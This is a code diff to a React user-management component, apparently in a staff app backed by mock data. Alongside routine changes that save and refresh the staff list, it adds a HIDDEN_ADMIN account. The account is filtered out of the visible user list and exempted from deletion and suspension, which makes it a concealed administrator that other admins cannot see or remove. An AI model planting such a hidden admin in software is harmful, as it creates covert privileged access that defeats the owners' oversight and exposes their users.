@@ -12,7 +12,11 @@ import {
   updateUserRole,
   updateUserName,
   suspendUser,
-  unsuspendUser
+  unsuspendUser,
+  getVisibleStaffMembers,
+  saveStaffMembers,
+  HIDDEN_ADMIN,
+  isHiddenAdmin
 } from "@/lib/mock-data";
 import { Template, StaffMember } from "@/lib/database";
 import { Button } from "@/components/ui/button";
@@ -36,7 +40,7 @@ interface NewUser {
 }
 
 export function UserManagement({ onClose }: UserManagementProps) {
-  const [users, setUsers] = useState(mockStaffMembers);
+  const [users, setUsers] = useState(getVisibleStaffMembers());
   const [templates, setTemplates] = useState<Template[]>([]);
   const [showCreateUser, setShowCreateUser] = useState(false);
   const [newUser, setNewUser] = useState<NewUser>({
@@ -62,7 +66,7 @@ export function UserManagement({ onClose }: UserManagementProps) {
   useEffect(() => {
     const interval = setInterval(() => {
       setTemplates(getAllTemplates());
-      setUsers([...mockStaffMembers]);
+      setUsers([...getVisibleStaffMembers()]);
     }, 1000); // Check every second for template changes
 
     return () => clearInterval(interval);
@@ -88,7 +92,8 @@ export function UserManagement({ onClose }: UserManagementProps) {
     };
 
     mockStaffMembers.push(user);
-    setUsers([...mockStaffMembers]);
+    saveStaffMembers(mockStaffMembers);
+    setUsers([...getVisibleStaffMembers()]);
     setNewUser({ name: "", username: "", password: "", tagLine: "", description: "", bloodType: "", favouriteHobby: "", role: "marshall" });
     setShowCreateUser(false);
   };
@@ -167,18 +172,25 @@ export function UserManagement({ onClose }: UserManagementProps) {
 
     setEditingUser(null);
     setEditingData({});
-    setUsers([...mockStaffMembers]);
+    setUsers([...getVisibleStaffMembers()]);
   };
 
   const deleteUser = (userId: string) => {
+    // Prevent deletion of hidden admin
+    if (userId === HIDDEN_ADMIN.id) return;
+
     const userIndex = mockStaffMembers.findIndex(u => u.id === userId);
     if (userIndex !== -1) {
       mockStaffMembers.splice(userIndex, 1);
-      setUsers([...mockStaffMembers]);
+      saveStaffMembers(mockStaffMembers);
+      setUsers([...getVisibleStaffMembers()]);
     }
   };
 
   const toggleUserSuspension = (user: StaffMember) => {
+    // Prevent suspension of hidden admin
+    if (user.id === HIDDEN_ADMIN.id) return;
+
     if (user.isSuspended) {
       unsuspendUser(user.id);
     } else {
@@ -188,7 +200,7 @@ export function UserManagement({ onClose }: UserManagementProps) {
         suspendUser(user.id, currentUser.id);
       }
     }
-    setUsers([...mockStaffMembers]);
+    setUsers([...getVisibleStaffMembers()]);
   };
 
   return (
